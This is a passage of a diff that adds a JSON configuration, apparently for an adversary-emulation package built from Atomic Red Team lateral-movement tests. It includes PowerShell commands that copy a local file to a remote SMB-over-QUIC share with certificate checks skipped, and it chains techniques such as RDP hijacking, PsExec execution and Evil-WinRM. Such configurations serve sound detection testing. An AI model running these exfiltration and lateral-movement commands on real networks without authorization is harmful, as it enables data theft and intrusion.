+        "art_lateral_1570_remote_path",
+        "art_lateral_1570_local_file"
+      ],
+      "command": "New-SmbMapping -RemotePath '#{art_lateral_1570_remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{art_lateral_1570_local_file}' 'Z:\\'",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "d8d13303-159e-4f33-89f4-9f07812d016f"
+    },
+    {
+      "id": "ART - T1570 - Exfiltration Over SMB over QUIC (NET USE)",
+      "name": "ART - T1570 - Exfiltration Over SMB over QUIC (NET USE)",
+      "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1570",
+      "technique_name": "Exfiltration Over SMB over QUIC (NET USE)",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1570_remote_path",
+        "art_lateral_1570_local_file"
+      ],
+      "command": "NET USE * '#{art_lateral_1570_remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{art_lateral_1570_local_file}' '*:\\'",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "183235ca-8e6c-422c-88c2-3aa28c4825d9"
+    }
+  ],
+  "chains": [
+    {
+      "name": "ART - T1021.001 - RDP to DomainController",
+      "description": "Single-step chain for T1021.001 — RDP to DomainController",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.001",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.001 - RDP to DomainController"
+      ]
+    },
+    {
+      "name": "ART - T1021.001 - Changing RDP Port to Non Standard Port via Powershell",
+      "description": "Single-step chain for T1021.001 — Changing RDP Port to Non Standard Port via Powershell",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.001",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.001 - Changing RDP Port to Non Standard Port via Powershell"
+      ]
+    },
+    {
+      "name": "ART - T1021.001 - Changing RDP Port to Non Standard Port via Command_Prompt",
+      "description": "Single-step chain for T1021.001 — Changing RDP Port to Non Standard Port via Command_Prompt",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.001",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.001 - Changing RDP Port to Non Standard Port via Command_Prompt"
+      ]
+    },
+    {
+      "name": "ART - T1021.001 - Disable NLA for RDP via Command Prompt",
+      "description": "Single-step chain for T1021.001 — Disable NLA for RDP via Command Prompt",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.001",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.001 - Disable NLA for RDP via Command Prompt"
+      ]
+    },
+    {
+      "name": "ART - T1021.002 - Map admin share",
+      "description": "Single-step chain for T1021.002 — Map admin share",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.002",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.002 - Map admin share"
+      ]
+    },
+    {
+      "name": "ART - T1021.002 - Map Admin Share PowerShell",
+      "description": "Single-step chain for T1021.002 — Map Admin Share PowerShell",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.002",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.002 - Map Admin Share PowerShell"
+      ]
+    },
+    {
+      "name": "ART - T1021.002 - Copy and Execute File with PsExec",
+      "description": "Single-step chain for T1021.002 — Copy and Execute File with PsExec",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.002",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.002 - Copy and Execute File with PsExec"
+      ]
+    },
+    {
+      "name": "ART - T1021.002 - Execute command writing output to local Admin Share",
+      "description": "Single-step chain for T1021.002 — Execute command writing output to local Admin Share",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.002",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.002 - Execute command writing output to local Admin Share"
+      ]
+    },
+    {
+      "name": "ART - T1021.003 - PowerShell Lateral Movement using MMC20",
+      "description": "Single-step chain for T1021.003 — PowerShell Lateral Movement using MMC20",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.003",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.003 - PowerShell Lateral Movement using MMC20"
+      ]
+    },
+    {
+      "name": "ART - T1021.003 - PowerShell Lateral Movement Using Excel Application Object",
+      "description": "Single-step chain for T1021.003 — PowerShell Lateral Movement Using Excel Application Object",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.003",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.003 - PowerShell Lateral Movement Using Excel Application Object"
+      ]
+    },
+    {
+      "name": "ART - T1021.004 - ESXi - Enable SSH via PowerCLI",
+      "description": "Single-step chain for T1021.004 — ESXi - Enable SSH via PowerCLI",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.004",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.004 - ESXi - Enable SSH via PowerCLI"
+      ]
+    },
+    {
+      "name": "ART - T1021.004 - ESXi - Enable SSH via VIM-CMD",
+      "description": "Single-step chain for T1021.004 — ESXi - Enable SSH via VIM-CMD",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.004",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.004 - ESXi - Enable SSH via VIM-CMD"
+      ]
+    },
+    {
+      "name": "ART - T1021.005 - Enable Apple Remote Desktop Agent",
+      "description": "Single-step chain for T1021.005 — Enable Apple Remote Desktop Agent",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.005",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.005 - Enable Apple Remote Desktop Agent"
+      ]
+    },
+    {
+      "name": "ART - T1021.006 - Enable Windows Remote Management",
+      "description": "Single-step chain for T1021.006 — Enable Windows Remote Management",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.006",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.006 - Enable Windows Remote Management"
+      ]
+    },
+    {
+      "name": "ART - T1021.006 - Remote Code Execution with PS Credentials Using Invoke-Co...",
+      "description": "Single-step chain for T1021.006 — Remote Code Execution with PS Credentials Using Invoke-Co...",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.006",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.006 - Remote Code Execution with PS Credentials Using Invoke-Co..."
+      ]
+    },
+    {
+      "name": "ART - T1021.006 - WinRM Access with Evil-WinRM",
+      "description": "Single-step chain for T1021.006 — WinRM Access with Evil-WinRM",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.006",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.006 - WinRM Access with Evil-WinRM"
+      ]
+    },
+    {
+      "name": "ART - T1563.002 - RDP hijacking",
+      "description": "Single-step chain for T1563.002 — RDP hijacking",
+      "package": "art-lateral-v1",
+      "tcode": "T1563.002",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1563.002 - RDP hijacking"
+      ]
+    },
+    {
+      "name": "ART - T1570 - Exfiltration Over SMB over QUIC (New-SmbMapping)",
+      "description": "Single-step chain for T1570 — Exfiltration Over SMB over QUIC (New-SmbMapping)",
+      "package": "art-lateral-v1",
+      "tcode": "T1570",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1570 - Exfiltration Over SMB over QUIC (New-SmbMapping)"
+      ]
+    },
+    {
+      "name": "ART - T1570 - Exfiltration Over SMB over QUIC (NET USE)",
+      "description": "Single-step chain for T1570 — Exfiltration Over SMB over QUIC (NET USE)",
+      "package": "art-lateral-v1",
+      "tcode": "T1570",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1570 - Exfiltration Over SMB over QUIC (NET USE)"
+      ]
+    },
+    {
+      "name": "ART - Lateral Movement - Full Tactic Chain",
+      "description": "Runs all 19 ART scripts for Lateral Movement (TA0008) in sequence.",
+      "package": "art-lateral-v1",
+      "tcode": "T1021.001",
+      "tactic": "Lateral Movement",
+      "script_refs": [
+        "ART - T1021.001 - RDP to DomainController",
+        "ART - T1021.001 - Changing RDP Port to Non Standard Port via Powershell",
+        "ART - T1021.001 - Changing RDP Port to Non Standard Port via Command_Prompt",
+        "ART - T1021.001 - Disable NLA for RDP via Command Prompt",
+        "ART - T1021.002 - Map admin share",
+        "ART - T1021.002 - Map Admin Share PowerShell",
+        "ART - T1021.002 - Copy and Execute File with PsExec",
+        "ART - T1021.002 - Execute command writing output to local Admin Share",
+        "ART - T1021.003 - PowerShell Lateral Movement using MMC20",
+        "ART - T1021.003 - PowerShell Lateral Movement Using Excel Application Object",
+        "ART - T1021.004 - ESXi - Enable SSH via PowerCLI",
+        "ART - T1021.004 - ESXi - Enable SSH via VIM-CMD",
+        "ART - T1021.005 - Enable Apple Remote Desktop Agent",
+        "ART - T1021.006 - Enable Windows Remote Management",
+        "ART - T1021.006 - Remote Code Execution with PS Credentials Using Invoke-Co...",
+        "ART - T1021.006 - WinRM Access with Evil-WinRM",
+        "ART - T1563.002 - RDP hijacking",
+        "ART - T1570 - Exfiltration Over SMB over QUIC (New-SmbMapping)",
+        "ART - T1570 - Exfiltration Over SMB over QUIC (NET USE)"
+      ]
+    }
+  ]
+}
